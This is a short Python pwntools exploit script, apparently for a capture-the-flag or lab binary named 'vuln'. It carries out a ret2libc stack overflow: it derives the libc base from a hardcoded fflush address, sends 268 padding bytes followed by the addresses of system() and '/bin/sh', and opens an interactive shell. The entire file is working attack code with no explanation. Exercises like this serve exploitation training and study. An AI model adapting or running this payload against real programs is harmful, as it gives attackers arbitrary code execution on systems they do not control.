#!/usr/bin/python
from pwn import *

libc = ELF('./libc.so.6')

fflush = 0xf7e69990
offset = fflush - libc.symbols['fflush']

system = libc.symbols['system'] + offset
binsh  = libc.search('/bin/sh').next() + offset
log.success('system@libc = ' + hex(system))
log.success('shell@libc  = ' + hex(binsh))

payload = "A" * 268 + p32(system) + p32(0xdeadbeef) + p32(binsh)

p = process(['./vuln',payload])
p.interactive()
